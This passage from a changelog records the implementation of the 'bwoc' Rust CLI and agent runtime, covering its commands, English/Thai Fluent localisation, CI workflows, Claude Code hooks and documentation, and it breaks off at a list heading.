- `crates/bwoc-cli` — **`bwoc new <name> --role ... --primary-model ... --lint-cmd ... --format-cmd ... --test-cmd ... --build-cmd ...`** implemented. Ports `incarnate.sh` plus the manifest-input spec from `INCARNATION.en.md` §"Setting the Manifest". Recursively copies template (skips `.git/`, `*.example.*`), creates backend symlinks (Unix only; Windows deferred), writes a flat resolved manifest. Kebab-case name validation. Refuses if target exists. Auto-detects template by walking up cwd ancestors. Live end-to-end verified: `bwoc new` then `bwoc check` returns 15 PASS / 0 violations.
- `crates/bwoc-cli` — **`bwoc new` interactive TTY prompts** for missing required fields. Uses `std::io::IsTerminal` (no new dep). On TTY: prompts each missing field with `{key} ({description}): ` where description comes from the template's `config.manifest.json` `requiredConfig.<field>.description`. On non-TTY: collects ALL missing fields in one pass and fails fast with exit code 2 and a comma-separated list — no partial blocking on stdin in CI. Empty prompt response is treated as missing. Two new unit tests cover the fail-fast path and template-description loading.
- `crates/bwoc-cli` — **`bwoc spawn [--path <agent>] [--backend <claude\|agy\|codex\|kimi>] [-- <args>...]`** implemented. Validates the path is a BWOC agent (has `AGENTS.md`), then exec's the backend CLI in the agent's directory via `std::process::Command::status()` (cross-platform; propagates exit code). Default backend is `claude`. Backend-not-found returns actionable "backend CLI 'X' not found on PATH" error. Extra args after `--` pass verbatim to the backend. Four new unit tests cover backend CLI mapping, missing-path rejection, non-agent-dir rejection, and template acceptance. Live verification: `bwoc spawn --path modules/agent-template --backend kimi` successfully launched Kimi Code CLI in the agent directory.

**Phase 1 v2.0 uppāda surface — DoD reached**

The three-command uppāda arc (`bwoc new` → `bwoc check` → `bwoc spawn`) now works end-to-end via the Rust CLI without any shell-script invocation. Software-Version 0.1.21.

- `bwoc-core::workspace::{Workspace, WorkspaceMeta, WorkspaceDefaults, AgentsRegistry, AgentEntry}` — types for `.bwoc/workspace.toml` and `.bwoc/agents.toml` with TOML serde + load/save. New workspace-level dep: `toml = "0.9"`. Three unit tests cover workspace roundtrip, empty agents.toml, and agents-with-entries roundtrip.
- `crates/bwoc-cli` — **`bwoc init [path] [--force]`** implemented. Creates `.bwoc/workspace.toml` (name auto-derived from directory; version `0.1.0`; created stamp UTC ISO 8601) + `.bwoc/agents.toml` (empty registry with a comment header) + the `agents/` directory (per `agents_dir` default). Refuses if `workspace.toml` already exists; `--force` overrides. UTC ISO 8601 stamp computed from `SystemTime` + a small proleptic-Gregorian conversion to avoid pulling in `chrono`/`time`. Four new unit tests cover creation, idempotency refusal, force-overwrite, and date-format anchors (epoch boundaries + 2024 leap day).
- `crates/bwoc-cli` — **`bwoc workspace info [path]`** + **`bwoc workspace validate [path]`** implemented. `info` dumps resolved workspace path, config (name/version/created/defaults), and agent count + per-agent rows from `agents.toml`. `validate` runs the 5 rules from `WORKSPACE.en.md` §"Validation Rules" — `.bwoc/` exists; `workspace.toml` parses + has required `name`/`created` fields; `version` is parseable SemVer (strict X.Y.Z); `agents.toml` parses; `agents_dir` exists — and exits 0 (complete) or 2 (violations). Short-circuits early on structural failures (missing `.bwoc/`, malformed `workspace.toml`). Pure-data `validate()` + `print_validation_report()` for testability; 4 new unit tests cover SemVer validation, missing `.bwoc/`, clean workspace, and bad SemVer. Live-verified against `bwoc init`'d workspace: 7 PASS / 0 violations; degraded scenario (deleted `agents/`) yields 6 PASS / 1 FAIL with the missing-dir message.
- `crates/bwoc-agent` — **real runtime, no longer a stub.** Reads `config.manifest.json` from the current directory and prints structured liveness with the agent identity (`I am alive: <agentId>` + role + model + fallback + memory + version). Exit 0 on success; exit 2 if cwd is not an incarnated agent (missing `config.manifest.json`) with an actionable message; exit 1 on manifest parse failure. Pure-data `liveness_banner(&Manifest) -> String` separated from `main` for unit testability; 2 new unit tests cover required-fields presence and optional-fallback omission. Live-verified inside an incarnated agent directory: prints all six lines correctly; non-agent dir gives "no config.manifest.json in <path>" and exits 2.
- `crates/bwoc-cli` — **`bwoc new` auto-registers the new agent in the enclosing workspace's `.bwoc/agents.toml`** when one is found. Walks ancestors from `target.parent()` for `.bwoc/workspace.toml`; if found, appends an `AgentEntry { id, path (relative to workspace root), backend, incarnated (UTC ISO 8601), status: "active" }` to the registry. New `--backend` flag (defaults `claude`) records which LLM backend the agent runs against. Best-effort: registration failures log a warning but do NOT fail the incarnation (the agent files are already valid on disk). Refuses to register a duplicate agent_id (`NewError::DuplicateRegistration` — user must `bwoc retire` first). Outside any workspace, the report says "No workspace found in ancestors — agent not registered in any agents.toml". 1 new unit test for ancestor-walk. Live-verified both scenarios.
- `crates/bwoc-cli/src/util.rs` — extracted shared `utc_now_iso8601()` + `format_iso8601(secs)` helpers (previously in `init.rs`), now consumed by both `init` and `new`. 1 unit test covers the same 4 epoch-anchor fixtures.
- `crates/bwoc-cli/src/user_home.rs` — Phase 1 minimum `~/.bwoc/` bootstrap per `WORKSPACE.en.md` §"Central Memory". `ensure_initialized()` creates `~/.bwoc/` + an empty `config.toml` (with a header pointing at the spec) if missing; idempotent and cheap when they exist. Cross-platform home-dir lookup via `$HOME` (Unix) / `%USERPROFILE%` (Windows), no `dirs` crate dep. Called from `main` at startup as best-effort — failure logs a warning but does not block commands. Memory/, workspaces.toml, logs/ are deferred to the commands that need them (Mattaññutā — don't create speculatively). 2 unit tests cover creation + idempotency-without-overwrite. Live-verified: `HOME=/tmp/fake-home bwoc` creates `.bwoc/config.toml` from scratch; `env -u HOME bwoc` prints the warning and still runs.
- `crates/bwoc-core` — **`manifest::Manifest`** type with serde camelCase keys (`agentId`, `primaryModel`, `lintCmd`, ...), `load_from_path` + `save_to_path`, `ManifestError` (thiserror) for IO + JSON failures. Two unit tests cover JSON roundtrip and camelCase serialization with `skip_serializing_if` for None options.
- `scripts/install.sh` — one-command install of the `bwoc` CLI (`./scripts/install.sh` runs `cargo install --path crates/bwoc-cli --locked` with toolchain check + PATH hint).
- `crates/bwoc-agent` — minimal "I am alive" runtime stub shipped with each incarnated agent.
- `crates/bwoc-cli/locales/{en,th}/cli.ftl` — Project Fluent locale skeletons; **TH and EN ship at launch**; any future language is a folder drop.

**Crate-level documentation**

- `crates/bwoc-core/README.md` — pure-data scope, `LifecyclePhase` arc surfacing in code.
- `crates/bwoc-cli/README.md` — install, `--lang` precedence example, command surface table organized by arc phase.
- `crates/bwoc-agent/README.md` — phase-scoped responsibility table (Phase 1 = liveness only; Phase 2 = task loop + socket; Phase 3 = interconnect + vaya).

**Framework reference**

- `docs/en/GLOSSARY.en.md` + `docs/th/GLOSSARY.th.md` — single alphabetized lookup table of every Pali term in BWOC with one-line engineering meaning. Bilingual. Designed so non-Buddhist newcomers can read framework code/specs without learning all 22 frameworks first.
- `docs/en/ARCHITECTURE.en.md` + `docs/th/ARCHITECTURE.th.md` — implementation stack (framework → template → agent → CLI → runtime), `bwoc spawn` information flow, backend-neutrality mechanism, multilingual structure across docs / root metadata / CLI locales, and trust boundary table cross-referencing `THREAT-MODEL`. Distinct from the conceptual stack in `PHILOSOPHY` and `README`.
- `docs/en/INCARNATION.en.md` + `docs/th/INCARNATION.th.md` — canonical step-by-step "how to create a new agent" doc consolidating content previously scattered across `incarnate.sh` comments, root README, and `modules/agent-template/README.md`. Covers prerequisites, six-step walkthrough, adding a backend, multilingual setup, verification checklist, and post-incarnation reading path. **Extended with**: "Setting the Manifest" section spec'ing that `bwoc new` accepts manifest fields via flags + interactive TTY prompts (non-TTY = fail-fast), driven by the `requiredConfig` schema in `config.manifest.json`; "Editing the Manifest After Incarnation" specifies direct file edit as canonical with `bwoc manifest set/get` deferred to Phase 2.

**Continuous integration**

- `.github/workflows/ci.yml` — minimal CI on ubuntu-latest: `cargo fmt --check`, `cargo clippy --workspace -- -D warnings`, `cargo build --workspace`, `cargo test --workspace`. Single-OS by intent (multi-OS matrix + release pipeline are Phase 2). Scaffold passes all four gates locally before CI is wired.
- `.github/workflows/docs.yml` — runs the `*.md` naming audit on every PR/push that touches markdown. Three gates per `docs/en/NAMING.en.md` §Audit: (A) root-level files must match `UPPERCASE.md`, `UPPERCASE.<lang>.md`, or the Claude Code convention `CLAUDE.local.md`; (B) files inside `docs/<lang>/` and `modules/agent-template/docs/<lang>/` (mindepth 2) must match `UPPERCASE.<lang>.md`, with slot READMEs exempt; (C) anything under `*/notes/` must match `YYYY-MM-DD_<title>.md`. Emits `::error::` GitHub annotations on violations and exits non-zero. Audit greps refined this iter (allow `.local` suffix at root; `mindepth 2` to skip the docs/ root which holds slot-level examples). `NAMING.en.md` + `NAMING.th.md` + `.claude/skills/check-naming/SKILL.md` updated to keep the documented greps identical to what CI runs.

**Workspace resolution promoted to `workspace info` / `validate`**

- `crates/bwoc-cli/src/workspace.rs` — `run_info` and `run_validate` now use the full WORKSPACE.en.md resolution chain (`find_workspace_root`: explicit path → `BWOC_WORKSPACE` env → ancestor walk → cwd → exit 2). Previously they used cwd-only fallback. Backward compatible — passing an explicit path still works. New behavior: running `bwoc workspace info` or `bwoc workspace validate` from any subdir of a workspace now finds the workspace (no need to cd to root). Non-workspace dirs get the same actionable "no workspace found ... pass a path, set BWOC_WORKSPACE, or run `bwoc init` first" message as `bwoc list`. Dropped the now-unused `resolve_root` helper. Live-verified 4 scenarios: info from subdir, validate from subdir, info from non-workspace dir (exit 2), info with explicit path.

**Phase 1 v2.0 — DoD reached**

`docs/en/ROADMAP.en.md` and `docs/th/ROADMAP.th.md` "Remaining for ship" tables renamed to "Shipped in Phase 1 v2.0" — all 8 spec'd items + 2 follow-on capabilities (runtime-works-anywhere via embedded template; manual major/minor SemVer bumps) now ✓. Stale "Spec'd, not yet implemented" rows in `notes/2026-05-22_phase-1-v20-foundation.md` cleaned up (iters 6, 7, 10, 11 had implemented them; the notes hadn't been refreshed). Only outstanding Phase 1 work: HELD policy items (CODEOWNERS, ISSUE_TEMPLATE/config.yml) and the user's release-tag decision.

**Runtime: works from any directory**

- `crates/bwoc-cli/src/new.rs` — agent template now **embedded into the binary at compile time** via `include_dir!("$CARGO_MANIFEST_DIR/../../modules/agent-template")`. `resolve_template` chain: `--template <path>` → `$BWOC_TEMPLATE` env → ancestor walk for `modules/agent-template/` → `~/.bwoc/template/` cache → **embedded fallback** (extracted to a pid-tagged tmp dir per invocation). Closes the "bwoc new must be run from inside the framework" UX wart.
- `default_target` updated to mirror the resolution: framework-dev path keeps "drop next to template"; everywhere else defaults to `cwd/agent-<name>` (was previously `template.parent().parent()/agent-<name>` which resolved to `/agent-<name>` when template was a tmp dir).
- `crates/bwoc-cli/Cargo.toml` + workspace `Cargo.toml` — add `include_dir = "0.7"` (1 new transitive dep `include_dir_macros`).
- Live-verified by running `bwoc new busaba ...` from `/tmp/learn-workspace-test/` (no framework in ancestors, no `~/.bwoc/template/` cache) → agent created cleanly with AGENTS.md + the four backend symlinks.

**Version bumping**

- `scripts/bump-version.sh <major|minor|patch> [--software|--document|--both]` — manual SemVer bumps for major/minor (patch is still auto-bumped on every Claude Code edit by `.claude/hooks/auto-version.sh`). Computes the new version, writes back to `Cargo.toml` (Software-Version, canonical) and `VERSION.md` (Software-Version mirror + Document-Version), and refreshes the `Last-Updated` UTC ISO 8601 stamp. Edits via shell — not Claude tools — so the auto-version hook doesn't re-fire and bump on top. Smoke-tested across all 3 levels × 3 targets.

**Installer upgrade**

- `scripts/install.sh` — adds `--force` to `cargo install` so re-running the script **upgrades in place** instead of erroring with "already installed". Detects existing install + phrases the message as "Upgrading bwoc in place (was: X.Y.Z)" vs first-install "Installing"; prints the new version after install. Comment header documents the embedded-template behavior + cross-references `bump-version.sh`.

**Fluent string conversion — `bwoc-agent`**

- `crates/bwoc-agent/src/i18n.rs` — new module (duplicated from `bwoc-cli/src/i18n.rs`, intentionally not extracted to bwoc-core yet — see file header). `bundle_for(lang)`, `t`, `t_with`, plus `resolve_lang()` matching bwoc-cli's chain (`BWOC_LANG` → `LANG` → `en`).
- `crates/bwoc-agent/locales/{en,th}/agent.ftl` — 7 keys: 6 liveness lines (alive, role, model, fallback, memory, version) + 1 missing-manifest error.
- `crates/bwoc-agent/Cargo.toml` — adds `fluent-bundle` + `unic-langid` from workspace deps.
- `crates/bwoc-agent/src/main.rs` — `liveness_banner(&Manifest, &FluentBundle)`; missing-manifest error path also localized. Parse-error path stays English.
- TH translation: "I am alive" → "ฉันยังมีชีวิตอยู่"; labels like "role:"/"model:" stay English (programmer-standard technical terms). 4 new i18n unit tests + 3 banner tests (was 2 — now 7 in bwoc-agent).
- Live-verified: from inside an incarnated agent dir, `bwoc-agent` prints EN banner; `BWOC_LANG=th bwoc-agent` prints TH banner.

**Phase 1 v2.0 Fluent conversion — COMPLETE across all 8 CLI/agent surfaces** (init · list · spawn · workspace info · workspace validate · check · new · bwoc-agent).

**Fluent string conversion — `bwoc new`**

- `crates/bwoc-cli/locales/{en,th}/cli.ftl` — 10 new `new-*` keys: report header lines (incarnated agent + target), workspace-registration status (registered with `$path` / not-registered), next-steps header + 4 numbered steps (cd & check, edit AGENTS.md, edit persona, git commit), and the interactive prompt format (`new-prompt-format` with `$key` + `$desc`). TH: "Incarnated agent" → "สร้าง agent"; "Target" → "เป้าหมาย"; "Next steps" → "ขั้นต่อไป"; "ตรวจสอบ neutrality" for the check sub-step, etc.
- `crates/bwoc-cli/src/new.rs` — `run()` / `incarnate()` / `resolve()` / `resolve_one()` / `print_report()` all now take or thread a `&FluentBundle<FluentResource>`. The interactive prompt format uses `new-prompt-format` instead of the hardcoded `"{key} ({desc}): "` template. Symlink lines stay literal (data, not labels). Error path stays English.
- `crates/bwoc-cli/src/main.rs` — `NewArgs::into_runtime(lang)` symmetric with init/list/spawn.
- Mid-iter fixes: missing `use crate::i18n;` import in new.rs (cascaded into 11 errors); two unit tests updated to pass `lang: "en"` in fixture args and `&bundle` into `resolve()`.
- Live-verified EN ("Incarnated agent: agent-alphaen / Target: ... / Next steps: ...") and TH ("สร้าง agent: agent-alphath / เป้าหมาย: ... / ขั้นต่อไป: ..."). 34 tests pass.

**Fluent string conversion — `bwoc check`**

- `crates/bwoc-cli/locales/{en,th}/cli.ftl` — 9 new `check-*` keys: header, target (with `$target`), 3 status labels (PASS/WARN/FAIL), success summary (with `$warnings`) + its tail line, failure summary (with `$violations`+`$warnings`) + its tail line. TH: `PASS`→`ผ่าน`, `WARN`→`เตือน`, `FAIL`→`ไม่ผ่าน`; "Neutrality check passed." → "การตรวจสอบ neutrality ผ่าน".
- `crates/bwoc-cli/src/check.rs` — `print_report()` now takes a `&FluentBundle<FluentResource>` and renders the header/labels/summary through `i18n::t`/`t_with`. `run()` signature changed to `run(target: &Path, lang: &str)` to thread the language. Finding descriptions (~10 rule-specific lines like "AGENTS.md contains {{agentId}}") stay English — translating those would balloon the .ftl by 15-20 keys for marginal benefit.
- `crates/bwoc-cli/src/main.rs` — Check dispatch passes resolved `lang` into `check::run`.
- Live-verified against `modules/agent-template`: EN ("Target: ..." / "PASS  ..." / "0 violations, 0 warning(s) / Neutrality check passed.") and TH ("เป้าหมาย: ..." / "ผ่าน  ..." / "0 ละเมิด, 0 คำเตือน / การตรวจสอบ neutrality ผ่าน"). 34 tests pass.

**Fluent string conversion — `bwoc workspace validate`**

- `crates/bwoc-cli/locales/{en,th}/cli.ftl` — 5 new keys: `validate-header` (with `$path`), `validate-label-pass`, `validate-label-fail`, `validate-summary-success` (with `$passes`), `validate-summary-failure` (with `$passes` + `$violations`). TH: `PASS` → `ผ่าน`, `FAIL` → `ไม่ผ่าน`, summary phrasings translated.
- `crates/bwoc-cli/src/workspace.rs` — `print_validation_report()` now takes the bundle and renders header + per-finding pass/fail prefix + summary through `i18n::t`/`t_with`. `run_validate` builds the bundle from `args.lang`. Finding descriptions (".bwoc/ exists", "workspace.toml parses", etc.) stay in English — translating ~10 rule-specific strings would balloon the .ftl file; deferred unless requested.
- `crates/bwoc-cli/src/main.rs` — `ValidateArgs.lang` plumbed; dispatch passes the resolved lang in.
- Live-verified 3 scenarios: EN happy (`7 pass(es), 0 violation(s) — workspace is complete.`), TH happy (`7 ผ่าน, 0 ละเมิด — workspace ครบถ้วน`), TH degraded with deleted `agents/` (`6 ผ่าน, 1 ละเมิด — แก้ก่อนใช้งาน workspace นี้`, exit 2).

**Fluent string conversion — `bwoc workspace info`**

- `crates/bwoc-cli/locales/{en,th}/cli.ftl` — 9 new keys: `info-header` (with `$path`), 7 `info-label-*` field labels (name/version/created/backend/lang/agents-dir/agents), and `info-agent-row` (with `$id`, `$status`, `$path`).
- `crates/bwoc-cli/src/workspace.rs` — `info()` now takes a `&FluentBundle<FluentResource>` and renders header + each labeled field + per-agent rows through `i18n::t`/`t_with`. `run_info` builds the bundle from `args.lang`. Error path stays English.
- `crates/bwoc-cli/src/main.rs` — `InfoArgs` now carries `lang`; dispatch passes the resolved `lang` in.
- **Known cosmetic** (carried over from iter 18): the labels were originally hardcoded literals, so the fixed-position colon alignment worked. Now labels vary by language (`name` vs `ชื่อ`, `version` vs `เวอร์ชัน`) and have different byte widths, so alignment is uneven. Acceptable for readability; a proper fix needs Unicode-width-aware padding (`unicode-width` crate or similar).
- Live-verified EN ("Workspace: /tmp/infoi18n / name: infoi18n / version: 0.1.0 / ...") and TH ("Workspace: /tmp/infoi18n / ชื่อ: infoi18n / เวอร์ชัน: 0.1.0 / สร้างเมื่อ: ... / agent: 1").

**Fluent string conversion — `bwoc spawn`**

- `crates/bwoc-cli/locales/{en,th}/cli.ftl` — 1 new `spawn-exec-status` message key with `$backend` and `$path` args. TH uses Thai preposition `ใน` ("in").
- `crates/bwoc-cli/src/spawn.rs` — `spawn()` builds its own bundle and emits the exec-status line via `i18n::t_with`. Error path (BackendNotFound, PathMissing, NotAnAgent, Io) stays English.
- `crates/bwoc-cli/src/main.rs` — `SpawnArgs::into_runtime(lang)` symmetric with init + list.
- Live-verified by spawning the real `codex` CLI in `modules/agent-template` from both EN and TH locales; status line correctly interpolates backend name + path.

**Fluent string conversion — `bwoc list`**

- `crates/bwoc-cli/locales/{en,th}/cli.ftl` — 5 new `list-*` message keys: `list-empty` (with `$path` arg), `list-col-id`, `list-col-status`, `list-col-backend`, `list-col-path`. TH translates `STATUS` → `สถานะ`; the other column labels stay as English ASCII (`ID`/`Backend`/`Path`) since they're programmer-standard terms.
- `crates/bwoc-cli/src/workspace.rs` — `run_list` now drives the success path through `i18n::t` / `t_with`. Error path stays English (same rule as `init`).
- `crates/bwoc-cli/src/main.rs` — `ListArgs` threads `lang` to runtime via `into_runtime(lang)`. Symmetric with `InitArgs`.
- **Known cosmetic**: Rust's `{:<10}` pads by byte count not visual width, so the Thai `สถานะ` column header is slightly off-alignment. Acceptable for now; fixing would require pulling in `unicode-width` and a width-aware formatter (deferred — not blocking readability).
- Live-verified 4 scenarios: EN empty, TH empty, EN populated, TH populated.

**Fluent string conversion — `bwoc init`**

- `crates/bwoc-cli/src/i18n.rs` — added `t_with(bundle, key, &[(name, value)])` for named-arg interpolation. The slice-of-tuples shape keeps call sites ergonomic without exposing `FluentArgs` directly. 1 new unit test (`t_with_interpolates_named_args`).
- `crates/bwoc-cli/locales/{en,th}/cli.ftl` — added 7 `init-*` message keys (success title, three created-file lines, next-steps header, two next-step suggestions). **Fluent gotcha caught**: `.` is not allowed in identifier names, so keys use `init-success-title` style, not `init.success-title`. First attempt panicked at runtime ("ExpectedToken('=')"); fixed by renaming and updating callers.
- `crates/bwoc-cli/src/init.rs` — `run()` now drives the success-path output through `i18n::t` / `t_with` with `lang` threaded down via `InitArgs`. Error path remains in English (`thiserror` localization deferred).
- `crates/bwoc-cli/src/main.rs` — passes the resolved `lang` into `init::InitArgs`.
- **Known cosmetic regression**: Fluent strips leading whitespace from single-line message values, so the `"  + "` indentation in the pre-Fluent `bwoc init` output is gone (output still reads cleanly). Restorable with Fluent's `{""}` empty-string placeable trick when we touch this surface again.

**`--lang` → Project Fluent wiring**

- `crates/bwoc-cli/src/i18n.rs` — new module exposing `bundle_for(lang)` and `t(bundle, key)`. Locale files (`locales/<lang>/cli.ftl`) embedded into the binary at compile time via `include_str!`, so distributed `bwoc` doesn't need to find them on disk. Unsupported language codes fall back to `en`. Fluent's default Unicode bidirectional isolation marks disabled for clean terminal output. Missing-key lookups return a visible `«missing key: <key>»` marker rather than panicking — surfaces gaps during dev. 4 new unit tests (EN content, TH content, unknown-lang fallback, missing-key marker).
- `crates/bwoc-cli/Cargo.toml` — new deps `fluent-bundle` + `unic-langid` (both already in `[workspace.dependencies]` from iter 1's scaffold; just inheriting them now).
- `crates/bwoc-cli/locales/en/cli.ftl` + `locales/th/cli.ftl` — added `default-help-hint` message (EN: "try `bwoc --help`"; TH: "ลองใช้ `bwoc --help`").
- `crates/bwoc-cli/src/main.rs` — replaces the default-no-subcommand `println!` literal with `i18n::t(&bundle, "default-help-hint")` driven by the resolved `--lang`. **This iter wires infrastructure plus ONE message as proof; converting the remaining `println!` literals across `check`/`new`/`spawn`/`init`/`workspace`/`list`/`bwoc-agent` is a follow-up so we don't bundle all string conversions into one iter (Mattaññutā).** Live-verified: `bwoc` → EN; `bwoc --lang th` → Thai; `BWOC_LANG=th bwoc` → Thai; `bwoc --lang ja` → EN fallback.

**`bwoc list`**

- `crates/bwoc-cli` — **`bwoc list [--workspace <path>]`** implemented. Reads the enclosing workspace's `.bwoc/agents.toml` and prints an id/status/backend/path table. Workspace resolution per `WORKSPACE.en.md` §"Workspace Resolution": explicit `--workspace` → `BWOC_WORKSPACE` env → ancestor walk for `.bwoc/workspace.toml` → cwd self-check → fail with actionable exit-2 error. Empty registry prints `(no agents in workspace <path>)` and exits 0. 1 new unit test for ancestor-walk. Live-verified 4 scenarios: empty workspace, two-agent workspace via `--workspace`, ancestor walk from a workspace subdir, and non-workspace dir (exit 2 with actionable message). Same full-resolution logic should later be promoted to `workspace info` / `validate` (logged as follow-up).

**Issue and PR templates (non-policy)**

- `.github/ISSUE_TEMPLATE/bug_report.md` — structured form with BWOC-specific fields: BWOC version, OS, Rust toolchain, backend (claude/agy/codex/kimi), surface (framework/template/CLI/runtime/hooks), and **arc phase** (uppāda/ṭhiti/vaya — where in the agent's life did this surface?). Includes a SECURITY redirect for exploitable defects.
- `.github/ISSUE_TEMPLATE/feature_request.md` — Problem/Solution/Alternatives shape grounded in Ariyasacca 4 (Dukkha → propose; Samudaya implied; Nirodha/Magga in scope section). Optional but-encouraged "Buddhist framework alignment" field referencing GLOSSARY.
- `.github/PULL_REQUEST_TEMPLATE.md` — Summary + What/Related/Checklist/Risk-and-rollback. The Checklist mirrors `CONTRIBUTING.md` §Pull Request Checklist verbatim PLUS adds bilingual-parity + naming-audit + manifest-schema gates that the CI workflows enforce.

These three are explicitly **non-policy** (mechanical forms that mirror existing CONTRIBUTING.md content). The policy-bearing items still HELD: `CODEOWNERS` (review-duty assignment) and `ISSUE_TEMPLATE/config.yml` (contact-routing URLs).

**Implementation logs (new convention)**

- `notes/` directory established with `notes/2026-05-22_phase-1-v20-foundation.md` as the starter — single session covering open-source hygiene + bilingual spec layer + Rust scaffold + auto-versioning + CI + over-engineering protection. Captures decisions, alternatives, and bugs surfaced.
- `CLAUDE.md` — "Implementation Logs (HARD RULE)" section added: every significant change gets `notes/YYYY-MM-DD_<title>.md` per the pattern in `NAMING.en.md`. One note per session, not per file.

**Modules layer (filled previously-empty placeholders)**

- `modules/README.md` — top-level modules overview (`agent-template/` ready · `plugins/` planned · `skills/` planned · `cli/` deprecated). Adds "Adding a new module" guidance.
- `modules/plugins/README.md` — planned framework plugins spec. Defines what plugins are (Tier 2 memory backends, additional LLM-backend integrations, workflow integrations), what they are NOT (vendor-specific shortcuts), and that the loading mechanism lands with the first plugin.
- `modules/skills/README.md` — planned framework skills spec. Distinguishes framework skills from agent skills (per-agent slot) and from `.claude/skills/` (Claude Code project skills).
- `modules/agent-template/mindsets/SPEC.md` — agent slot spec. Mindsets = decision-making frameworks; one mindset per file; Obsidian frontmatter; "When NOT to apply" required; each anchors one Pali principle.
- `modules/agent-template/skills/SPEC.md` — agent slot spec. Skills = concrete capabilities; bounded; verifiable; cross-linked from `interconnect/capabilities.md`; maturity levels L1–L7 per Ariya-dhana 7.

**Tooling and process (Claude Code)**

- `CLAUDE.md` — framework-level guidance for Claude Code sessions.
- `.claude/skills/` — `/incarnate`, `/check-neutrality`, `/check-bilingual`, `/task-log`, `/check-naming` (project-scoped slash commands).
- `.claude/hooks/bilingual-reminder.sh` — `PostToolUse` `Write|Edit` hook reminding to update the matching TH file when an EN doc changes. **Extended** to cover (a) the **reverse direction** for `docs/<lang>/` (editing TH reminds about EN canonical) and (b) **root-level `FILENAME.md` ↔ `FILENAME.th.md`** (e.g., `VISION.md` ↔ `VISION.th.md`). Root-level canonical→translation only fires if the translation already exists, to avoid noisy reminders for unpaired files like `CHANGELOG.md`. Out-of-repo paths exit silently (matches `auto-version.sh` scoping). Pipe-tested all 8 scenarios.
- `.claude/hooks/auto-version.sh` — `PostToolUse` `Write|Edit` hook that auto-bumps SemVer PATCH on every Claude Code edit. Software domain (`.rs` / `.toml` / `crates/*`) bumps `Cargo.toml` `[workspace.package].version`; document domain (`.md`) bumps `VERSION.md` `Document-Version`. Both stamp `Last-Updated` (UTC, ISO 8601). Self-managed files are guarded against self-trigger.
- `docs/en/WORKSPACE.en.md` + `docs/th/WORKSPACE.th.md` — workspace concept spec. Defines on-disk structure (`.bwoc/workspace.toml`, `.bwoc/agents.toml`), validation rules ("complete before work"), CLI surface (`bwoc init`, `bwoc workspace info/validate`), workspace resolution precedence (`--workspace` flag → `BWOC_WORKSPACE` env → ancestor walk → cwd → refuse), central per-user memory at `~/.bwoc/` (config, memory, workspaces registry, logs), and memory scope hierarchy (per-agent → per-workspace → per-user → Tier 2).
- `docs/en/NAMING.en.md` + `docs/th/NAMING.th.md` — unified `*.md` naming standard with 12 categories, rule definitions, quick decision tree, and audit grep snippets. New note pattern `YYYY-MM-DD_<title>.md` (ISO 8601 date prefix + underscore + kebab-case title) for chronological notes; valid locations are `<repo>/notes/`, `<workspace>/.bwoc/notes/`, or `~/.bwoc/notes/`.
- `docs/en/ROADMAP.en.md` + `docs/th/ROADMAP.th.md` — phase-by-phase plan (Phase 1 v2.0 uppāda → Phase 4 fleet). Each phase has Definition of Done and links the spec doc each remaining item refers to. README Status table now points here for the full plan.
- `docs/en/FAQ.en.md` + `docs/th/FAQ.th.md` — newcomer FAQ across Conceptual, Project Mechanics, Setup, Multi-Language and Multi-Backend, Conventions, Operations, and Contributing categories. Extracts the three READMEs Qs and expands with Qs surfaced by VISION/GLOSSARY/ARCHITECTURE/INCARNATION/WORKSPACE/NAMING. README FAQ section now points here for the full set.
- `.claude/settings.json` — registers both hooks for the team.

**Phase 2 + 3 implementation arc** (theme-grouped; per-commit detail in `git log` and [`notes/2026-05-22_phase-2-thiti-surface.md`](notes/2026-05-22_phase-2-thiti-surface.md))

- **Lifecycle verbs** (Phase 3 vaya + state machine):
  - `bwoc retire <name>` (registry removal; `--keep-files` retains agent dir)
  - `bwoc stop <name>` — 3-step escalation ladder: socket `STOP` → SIGTERM → SIGKILL (~3s wait between steps); reports which step ended the daemon
  - `bwoc start <name>` — flips registry status AND spawns `bwoc-agent --serve`; `--no-daemon` opt-out; idempotent across all (status × daemon) combinations
  - `bwoc workspace prune` — reconciles phantom registry entries vs orphan agent dirs; `--apply` removes safe drift

- **Daemon + IPC** (Phase 2 ṭhiti):
  - `bwoc-agent --serve` Unix daemon: writes `.bwoc/agent.{pid,sock}`; line-text IPC protocol (`PING`/`STATUS`/`STOP`) debuggable with `nc -U`
  - Persistent inbox cursor (`.bwoc/inbox.cursor`) — daemon resumes after restart
  - `bwoc ping <agent>` — CLI client for PING
  - Stderr redirect to `<agent>/.bwoc/agent.log` for `bwoc log` to tail
  - `bwoc-agent --version` / `-V` / `--help` / `-h` flags (was: `--serve` only)
  - Windows: `--serve` is a clean cfg-gated stub (default mode + `--version`/`--help` work); named-pipe daemon path queued

- **Messaging stack** (sammā-vācā Phase 0):
  - `bwoc send <agent> <msg>` — JSONL envelope to `<agent>/.bwoc/inbox.jsonl`
  - `bwoc inbox <agent>` — `--limit` · `--json` · `--watch` · `--clear`
  - INBOX column in `bwoc list`
  - Daemon-side inbox watch: announces new envelopes to stderr as they arrive

- **Observation + UX**:
  - `bwoc list` — runtime ●/○ indicator; filters `--status` / `--backend` / `--running`
  - `bwoc status [name]` — health + identity + uptime; per-agent detail surfaces persona scope + mindset/skill/memory counts; `--json` mirrors the human shape
  - `bwoc dashboard` (TUI) — ratatui-based; agents pane + detail pane + 2s auto-refresh + `t` hotkey to spawn chat in a new tmux window + workspace-level projects/notes/memory counts in banner
  - `bwoc chat <agent>` — auto-resolves backend from registry; `--tmux` for new-window mode
  - `bwoc doctor` — env + workspace diagnostic; `--auto` sweeps stale `agent.pid` / `agent.sock` / `inbox.cursor`
  - `bwoc log <agent>` — tails daemon stderr; `-f` follow · `-n N` lines · `--clear` truncate-in-place
  - `bwoc completion <shell>` — bash/zsh/fish/powershell/elvish via clap_complete
  - `bwoc help` — 10 topical guides: `getting-started`, `backends`, `workspace`, `manifest`, `arc`, `lifecycle`, `daemon`, `messaging`, `persona`, `memory`
  - `--json` across read-only commands: `list`, `status`, `workspace info`, `workspace validate`, `check`, `inbox`, `memory list|search`
  - Banner ANSI Shadow wordmark + command index for the no-subcommand case
  - Unicode-width column padding in `bwoc list` (Thai header alignment)

- **Per-workspace memory** (`<workspace>/.bwoc/memory/`):
  - `bwoc init` scaffolds the directory with a README documenting the 4-tier scope hierarchy
  - `bwoc memory list | show | put | search` — full read/write/search CLI with path-traversal refusal, atomic write (stage-to-temp + rename), `--force` overwrite gate, case-insensitive substring search; both human and `--json` output where useful

- **Persona configuration at incarnation**:
